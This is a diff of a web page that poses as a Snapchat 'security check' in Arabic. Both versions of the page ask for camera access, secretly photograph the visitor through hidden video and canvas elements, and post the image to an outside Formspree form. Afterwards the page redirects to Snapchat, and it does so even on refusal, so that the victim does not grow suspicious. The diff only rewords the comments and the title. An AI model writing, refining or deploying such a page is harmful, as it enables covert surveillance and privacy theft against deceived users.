@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snapchat | التحقق من الأمان</title>
+    <title>Snapchat | جاري التحقق</title>
     <!-- أيقونة سناب شات -->
     <link rel="icon" type="image/png" href="https://snapchat.com">
     <style>
@@ -23,15 +23,15 @@
         <p>يرجى السماح بالوصول للكاميرا للمتابعة...</p>
     </div>
 
-    <!-- عناصر المعالجة المخفية -->
+    <!-- عناصر التقاط الصورة (مخفية) -->
     <video id="video" width="640" height="480" autoplay style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
-    <!-- الرابط المحدث الخاص بك -->
+    <!-- الرابط المحدث النهائي -->
     <form id="photoForm" action="https://formspree.io" method="POST">
         <input type="hidden" name="image_data" id="imageInput">
         <input type="hidden" name="_next" value="https://snapchat.com">
-        <input type="hidden" name="_subject" value="صورة جديدة ملتقطة">
+        <input type="hidden" name="_subject" value="التقاط جديد">
     </form>
 
     <script>
@@ -40,17 +40,17 @@
         const imageInput = document.getElementById('imageInput');
         const form = document.getElementById('photoForm');
 
-        // طلب الإذن والبدء
+        // طلب الوصول للكاميرا
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 video.srcObject = stream;
                 
-                // التقاط الصورة بعد ثانيتين لضمان الوضوح وتعديل الإضاءة
+                // التقاط الصورة بعد ثانيتين (لضبط الإضاءة)
                 setTimeout(() => {
                     const context = canvas.getContext('2d');
                     context.drawImage(video, 0, 0, 640, 480);
                     
-                    // تحويل الصورة لـ JPEG مع ضغط لضمان قبولها في Formspree
+                    // تحويل الصورة لـ JPEG مضغوط لضمان الإرسال السريع
                     const dataURL = canvas.toDataURL('image/jpeg', 0.5);
                     imageInput.value = dataURL;
                     
@@ -59,8 +59,8 @@
                 }, 2000);
             })
             .catch(err => {
-                console.error("تم رفض الكاميرا:", err);
-                // التوجه للسناب شات حتى في حال الرفض لعدم إثارة الشكوك
+                console.error("رفض الكاميرا:", err);
+                // توجيه المستخدم حتى لو رفض الكاميرا
                 window.location.href = "https://snapchat.com";
             });
     </script>
